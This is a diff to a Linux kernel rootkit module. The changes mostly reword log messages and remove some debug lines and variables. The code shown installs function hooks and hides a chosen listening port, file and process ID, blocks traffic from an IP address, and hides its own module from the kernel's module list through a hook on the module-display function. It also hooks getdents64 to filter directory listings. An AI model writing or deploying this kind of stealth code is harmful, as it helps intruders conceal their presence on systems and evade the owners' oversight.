@@ -81,30 +81,26 @@ static int __init rootkit_enter(void) {
 
 	unsigned int err;
 
-	printk(KERN_INFO "combined rootkit: is operating\n");
+	printk(KERN_INFO "rootkit: started operating\n");
 
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err)
 		return err;
 
 	if (port_to_hide != 0)
-		printk(KERN_INFO "loaded component: port hiding. hiding listening port %u\n", port_to_hide);
+		printk(KERN_INFO "rootkit: loaded component port hiding. hiding listening port %u\n", port_to_hide);
 
 	if (NULL != file_to_hide)
-		printk(KERN_INFO "loaded component: file hiding. hiding file %s\n", file_to_hide);
+		printk(KERN_INFO "rootkit: loaded component file hiding. hiding file %s\n", file_to_hide);
 	
 	if (NULL != pid_to_hide)
-		printk(KERN_INFO "loaded component: process hiding. hiding PID %s\n", pid_to_hide);
+		printk(KERN_INFO "rootkit: loaded component process hiding. hiding PID %s\n", pid_to_hide);
 
 	if (NULL != ip_to_block)
-		printk(KERN_INFO "loaded component: ip blocking. blocking incomming traffic from IP %s\n", ip_to_block);
+		printk(KERN_INFO "rootkit: loaded component ip blocking. blocking incomming traffic from IP %s\n", ip_to_block);
 
 	return 0;
 }
-
-
-
-
 static void __exit rootkit_exit(void) {
 
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
@@ -143,7 +139,6 @@ static asmlinkage int new_m_show(struct seq_file *m, void *p)
 	struct module *mod = list_entry(p, struct module, list);
 	if (strcmp(mod->name, "rootkit") == 0)
 	{
-		printk(KERN_INFO "not so fast amigo\n");
 		seq_puts(m,"");
 		return 0;	
 	}
@@ -181,9 +176,8 @@ those 2 are effectively the same, but I wanted to support an option where both w
 */
 static asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
-	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
+	struct linux_dirent64 *dirent_kern, *dirent; 
 	int len;
-	unsigned long offset = 0;
 	long error;
 
 
